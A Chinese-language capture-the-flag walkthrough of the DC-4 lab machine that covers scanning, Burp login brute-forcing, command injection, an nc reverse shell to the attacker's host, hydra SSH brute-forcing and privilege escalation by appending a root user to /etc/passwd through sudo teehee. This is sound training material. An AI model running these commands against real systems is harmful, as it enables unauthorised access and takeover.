## ****靶场信息****

kali：192.168.123.73

靶机：192.168.123.144

##  ** **信息收集****

 ** **端口扫描****

<a href="https://imgtg.com/image/b3u7a"><img
src="https://i.imgtg.com/2022/03/31/b3u7a.png" alt="b3u7a.png" border="0"></a>

得到80、22端口

 ** **目录扫描****

<a href="https://imgtg.com/image/b3IHS"><img
src="https://i.imgtg.com/2022/03/31/b3IHS.png" alt="b3IHS.png" border="0"></a>

##  ** **渗透过程****

 ** **Burp爆破****

通过burp爆破得到密码happy（需要burp返回包才可以进去）

<a href="https://imgtg.com/image/b33XN"><img
src="https://i.imgtg.com/2022/03/31/b33XN.png" alt="b33XN.png" border="0"></a>

 ** **命令执行****

看到List Files，应该可以命令执行，通过抓包，执行命令

<a href="https://imgtg.com/image/b3wxC"><img
src="https://i.imgtg.com/2022/03/31/b3wxC.png" alt="b3wxC.png" border="0"></a>

电脑版本

<a href="https://imgtg.com/image/bCMJL"><img
src="https://i.imgtg.com/2022/03/31/bCMJL.png" alt="bCMJL.png" border="0"></a>

当前工作目录

<a href="https://imgtg.com/image/bCOli"><img
src="https://i.imgtg.com/2022/03/31/bCOli.png" alt="bCOli.png" border="0"></a>

  

 ** **反弹SHELL****

nc -e /bin/sh 192.168.123.73 4444

<a href="https://imgtg.com/image/bCoBX"><img
src="https://i.imgtg.com/2022/03/31/bCoBX.png" alt="bCoBX.png" border="0"></a>

<a href="https://imgtg.com/image/bCqZt"><img
src="https://i.imgtg.com/2022/03/31/bCqZt.png" alt="bCqZt.png" border="0"></a>

发现两用户

<a href="https://imgtg.com/image/bC5cx"><img
src="https://i.imgtg.com/2022/03/31/bC5cx.png" alt="bC5cx.png" border="0"></a>

  

 ** **爆破SSH密码****

用hydra爆破ssh密码

密码在用户jim的目录

/home/jim/backups/old-passwords.bak

将文件复制下来，另存为一个文件，起名为password.txt

hydra -l jim -P password.txt -t 3 ssh://192.168.123.144

<a href="https://imgtg.com/image/bCTMj"><img
src="https://i.imgtg.com/2022/03/31/bCTMj.png" alt="bCTMj.png" border="0"></a>

获得用户名-密码：jim-jibril04

  

 ** **SSH连接****

ssh jim@192.168.123.144

在共享文件夹的mail发现邮件

<a href="https://imgtg.com/image/bCU7p"><img
src="https://i.imgtg.com/2022/03/31/bCU7p.png" alt="bCU7p.png" border="0"></a>

得到charles的ssh密码

连接charles的SSH

##  ** **teehee提权****

sudo -l发现不需要密码就可以使用/use/bin/teehee

使用teehee时又可以临时获得root权限 ，可以创建一个管理员

echo "admin::0:0:::/bin/sh" | sudo teehee -a /etc/passwd

<a href="https://imgtg.com/image/bCWLU"><img
src="https://i.imgtg.com/2022/03/31/bCWLU.png" alt="bCWLU.png" border="0"></a>

切换admin就行了

也可以用 crontab提权

##  ** **参考链接****

[ _反弹shell多种姿势_](https://www.jianshu.com/p/5b73a607e2ea)

[ _DC4靶场博客_](https://www.cnblogs.com/kinyoobi/p/15820613.html)

  

